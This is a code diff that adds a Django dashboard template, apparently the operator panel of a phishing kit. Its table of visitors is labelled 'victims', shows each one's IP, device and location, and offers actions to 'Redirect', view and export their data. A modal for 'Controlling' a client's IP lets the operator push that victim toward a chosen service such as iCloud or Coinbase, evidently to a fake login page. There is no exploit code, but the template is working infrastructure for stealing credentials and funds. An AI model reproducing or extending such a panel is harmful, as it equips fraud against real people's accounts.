@@ -1,0 +1,183 @@
+{% extends 'dashboard/base_dashboard.html' %}
+{% load static %}
+
+{% block title %}Main Dashboard{% endblock %}
+
+{% block content %}
+<div id="dashboard-content" class="content-section">
+    <div class="mb-8">
+        <h1 class="text-3xl font-semibold text-white">Welcome Back, <span id="main-username">{{ user.username|default:'User' }}</span>!</h1>
+        <p class="text-gray-400 mt-1" id="dashboard-quote">"The only way to do great work is to love what you do." - Steve Jobs</p>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+        <div class="bg-gray-800 bg-opacity-70 backdrop-blur-md p-6 rounded-xl shadow-lg border border-gray-700 hover:border-purple-500 transition-all duration-300 transform hover:scale-105">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-sm text-gray-400">Total Connects</p>
+                    <p class="text-3xl font-bold text-white" id="total-connects">{{ total_connects|default:0 }}</p> {# MODIFIED #}
+                </div>
+                <div class="p-3 bg-purple-600 bg-opacity-50 rounded-full">
+                    <i class="fas fa-link text-xl text-purple-300"></i>
+                </div>
+            </div>
+        </div>
+        <div class="bg-gray-800 bg-opacity-70 backdrop-blur-md p-6 rounded-xl shadow-lg border border-gray-700 hover:border-green-500 transition-all duration-300 transform hover:scale-105">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-sm text-gray-400">Total Visits</p>
+                    <p class="text-3xl font-bold text-white" id="total-visits">{{ total_visits|default:0 }}</p> {# MODIFIED #}
+                </div>
+                <div class="p-3 bg-green-600 bg-opacity-50 rounded-full">
+                    <i class="fas fa-eye text-xl text-green-300"></i>
+                </div>
+            </div>
+        </div>
+        <!-- Add other stat boxes if any -->
+    </div>
+    <div class="bg-gray-800 bg-opacity-70 backdrop-blur-md p-6 rounded-xl shadow-lg border border-gray-700">
+        <div class="flex items-center space-x-4 mb-4">
+            <input type="text" id="admin-search-box" placeholder="Search by IP, Page, etc..." class="w-full px-4 py-2 border border-gray-700 rounded-lg bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-purple-600 placeholder-gray-500 text-sm">
+        </div>
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm text-left text-gray-300">
+                <thead class="text-xs text-gray-400 uppercase bg-gray-700 bg-opacity-50">
+                    <tr>
+                        <th scope="col" class="px-3 py-3 text-center">IP Address</th>
+                        <th scope="col" class="px-3 py-3 text-center">Status</th>
+                        <th scope="col" class="px-3 py-3 text-center">Page</th>
+                        <th scope="col" class="px-3 py-3 text-center">Browser</th>
+                        <th scope="col" class="px-3 py-3 text-center">Device</th>
+                        <th scope="col" class="px-3 py-3 text-center">Location</th>
+                        <th scope="col" class="px-3 py-3 text-center">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="victims-table-body">
+                    <!-- Rows will be added by JavaScript -->
+                    <!-- Example of how a row might look (for structure reference) -->
+                    <!-- 
+                    <tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-700 transition-colors duration-150">
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 rounded-md"><i class="fas fa-network-wired text-lg text-gray-300"></i></div>
+                                <span class="text-[11px] text-gray-100 font-medium whitespace-nowrap leading-tight">152.58.134.187</span>
+                            </div>
+                        </td>
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 rounded-md"><i class="fas fa-eye-slash text-lg text-red-400"></i></div>
+                                <span class="text-[11px] text-gray-400 whitespace-nowrap leading-tight">Hidden</span>
+                            </div>
+                        </td>
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 rounded-md"><i class="fas fa-globe text-lg text-gray-300"></i></div>
+                                <span class="text-[11px] text-gray-400 whitespace-nowrap leading-tight">Root Page</span>
+                            </div>
+                        </td>
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 rounded-md"><i class="fab fa-chrome text-lg text-gray-300"></i></div>
+                                <span class="text-[11px] text-gray-400 whitespace-nowrap leading-tight">Chrome</span>
+                            </div>
+                        </td>
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 rounded-md"><i class="fas fa-mobile-alt text-lg text-gray-300"></i></div>
+                                <span class="text-[11px] text-gray-400 whitespace-nowrap leading-tight">Android</span>
+                            </div>
+                        </td>
+                        <td class="px-2 py-3">
+                            <div class="flex flex-col items-center text-center">
+                                <div class="h-7 w-7 flex items-center justify-center mb-0.5"><span class="text-2xl leading-none">🇮🇳</span></div>
+                                <span class="text-[11px] text-gray-400 whitespace-nowrap leading-tight">Kolkata</span>
+                            </div>
+                        </td>
+                        <td class="px-3 py-3 text-center">
+                            <div class="flex justify-center items-start">
+                                <div class="flex flex-col items-center text-center mx-1 cursor-pointer group view-btn" title="View Details">
+                                    <div class="p-2 bg-gray-700 rounded-md mb-1 group-hover:bg-purple-500 transition-all duration-150"><i class="fas fa-plus text-lg text-gray-300 group-hover:text-white"></i></div>
+                                    <span class="text-[10px] text-gray-400 group-hover:text-purple-300 transition-all duration-150">Redirect</span>
+                                </div>
+                                <div class="flex flex-col items-center text-center mx-1 cursor-pointer group delete-btn" title="Delete Client">
+                                    <div class="p-2 bg-gray-700 rounded-md mb-1 group-hover:bg-red-500 transition-all duration-150"><i class="fas fa-trash-alt text-lg text-gray-300 group-hover:text-white"></i></div>
+                                    <span class="text-[10px] text-gray-400 group-hover:text-red-300 transition-all duration-150">Delete</span>
+                                </div>
+                                <div class="flex flex-col items-center text-center mx-1 cursor-pointer group view-btn" title="View Details">
+                                    <div class="p-2 bg-gray-700 rounded-md mb-1 group-hover:bg-blue-500 transition-all duration-150"><i class="fas fa-eye text-lg text-gray-300 group-hover:text-white"></i></div>
+                                    <span class="text-[10px] text-gray-400 group-hover:text-blue-300 transition-all duration-150">View</span>
+                                </div>
+                                <div class="flex flex-col items-center text-center mx-1 cursor-pointer group export-btn" title="Export Data">
+                                    <div class="p-2 bg-gray-700 rounded-md mb-1 group-hover:bg-green-500 transition-all duration-150"><i class="fas fa-file-export text-lg text-gray-300 group-hover:text-white"></i></div>
+                                    <span class="text-[10px] text-gray-400 group-hover:text-green-300 transition-all duration-150">Export</span>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                    -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+<div id="redirectServiceModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-75 backdrop-blur-sm p-4 hidden transition-opacity duration-300 ease-in-out opacity-0">
+    <div id="redirectServiceModalContent" class="bg-gray-800 border border-gray-700 text-white rounded-xl shadow-2xl w-full max-w-md transform scale-95 transition-all duration-300 ease-in-out opacity-0">
+        <!-- Modal Header -->
+        <div class="flex items-center justify-between p-5 border-b border-gray-700">
+            <div>
+                <h3 class="text-xl font-semibold">Select Service</h3>
+                <p class="text-xs text-gray-400 mt-1">Controlling <span id="redirectClientIp" class="font-medium text-purple-400">N/A</span></p>
+            </div>
+            <button id="closeRedirectModalBtn" type="button" class="text-gray-400 bg-transparent hover:bg-gray-700 hover:text-white rounded-lg text-sm p-1.5 ml-auto inline-flex items-center transition-colors">
+                <i class="fas fa-times text-xl"></i>
+                <span class="sr-only">Close modal</span>
+            </button>
+        </div>
+
+        <!-- Modal Body -->
+        <div class="p-5 space-y-4">
+            <!-- Search Input -->
+            <div>
+                <div class="relative">
+                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                        <i class="fas fa-search text-gray-400"></i>
+                    </div>
+                    <input type="text" id="redirectServiceSearch" class="w-full bg-gray-700 border border-gray-600 text-gray-200 text-sm rounded-lg focus:ring-purple-500 focus:border-purple-500 block pl-10 p-2.5 placeholder-gray-400" placeholder="Search services...">
+                </div>
+            </div>
+
+            <!-- Service List (Scrollable) -->
+            <div id="redirectServiceListContainer" class="max-h-60 overflow-y-auto space-y-2 pr-2 custom-scrollbar">
+                <!-- Service items will be populated by JavaScript or hardcoded here initially -->
+                <!-- Example Service Item Structure:
+                <div class="redirect-service-item flex items-center justify-between p-3 bg-gray-750 hover:bg-gray-600 rounded-lg cursor-pointer transition-colors">
+                    <div class="flex items-center">
+                        <i class="fab fa-apple text-xl mr-3 text-gray-300"></i>
+                        <span class="text-sm font-medium">iCloud</span>
+                    </div>
+                    <i class="fas fa-chevron-down text-gray-400"></i>
+                </div>
+                <div class="redirect-service-item flex items-center justify-between p-3 bg-gray-750 hover:bg-gray-600 rounded-lg cursor-pointer transition-colors">
+                    <div class="flex items-center">
+                        <span class="w-5 h-5 flex items-center justify-center rounded-full bg-blue-600 text-white text-xs font-bold mr-3">C</span>
+                        <span class="text-sm font-medium">Coinbase</span>
+                    </div>
+                    <i class="fas fa-chevron-down text-gray-400"></i>
+                </div>
+                 -->
+            </div>
+        </div>
+
+        <!-- Modal Footer -->
+        <div class="flex items-center p-5 border-t border-gray-700 rounded-b-xl">
+            <button id="confirmRedirectBtn" type="button" class="w-full text-white bg-purple-600 hover:bg-purple-700 focus:ring-4 focus:outline-none focus:ring-purple-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-colors button-glow">
+                <i class="fas fa-arrow-right mr-2"></i>Redirect to Service
+            </button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<!-- Add any page-specific JavaScript for dashboard.html here if needed -->
+{% endblock %}
